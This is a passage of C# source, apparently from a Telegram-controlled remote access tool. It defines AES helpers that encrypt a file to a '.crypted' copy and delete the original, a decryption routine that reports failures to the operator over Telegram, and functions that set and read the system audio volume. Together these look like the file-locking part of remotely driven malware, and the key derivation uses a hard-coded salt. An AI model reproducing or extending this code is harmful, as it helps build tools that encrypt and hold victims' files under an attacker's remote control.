                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                        return ms.ToArray();
                    }
                }
            }
        }

        // Decrypt string
        private static byte[] DecryptBytes(byte[] cipherBytes, string EncryptionKey)
        {
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        try
                        {
                            cs.Close();
                        }
                        catch (CryptographicException)
                        {
                            telegram.sendText("Failed to decrypt file. Wrong password!");
                            return ms.ToArray();
                        }
                    }
                    return ms.ToArray();
                }
            }
        }

        // Encrypt file
        private static void EncryptFile(string inputFile, string password)
        {
            // Check file
            if (!File.Exists(inputFile))
            {
                return;
            }
            string outputFile = inputFile + ".crypted";
            byte[] content = File.ReadAllBytes(inputFile);
            byte[] encrypted = EncryptBytes(content, password);
            File.WriteAllBytes(outputFile, encrypted);
            File.Delete(inputFile);
        }

        // Decrypt file
        private static void DecryptFile(string inputFile, string password)
        {
            // Check file
            if (!File.Exists(inputFile))
            {
                return;
            }
            string outputFile = inputFile.Replace(".crypted", "");
            byte[] content = File.ReadAllBytes(inputFile);
            byte[] decrypted = DecryptBytes(content, password);
            File.WriteAllBytes(outputFile, decrypted);
            File.Delete(inputFile);
        }

        // Set audio volume
        public static void AudioVolumeSet(int volume)
        {
            // Set volume
            AudioSwitcher.AudioApi.CoreAudio.CoreAudioDevice defaultPlaybackDevice = new AudioSwitcher.AudioApi.CoreAudio.CoreAudioController().DefaultPlaybackDevice;
            defaultPlaybackDevice.Volume = volume;
        }

        // Get audio volume
        public static double AudioVolumeGet()
        {
            // Get volume
            AudioSwitcher.AudioApi.CoreAudio.CoreAudioDevice defaultPlaybackDevice = new AudioSwitcher.AudioApi.CoreAudio.CoreAudioController().DefaultPlaybackDevice;
            return defaultPlaybackDevice.Volume;
        }


    }
}
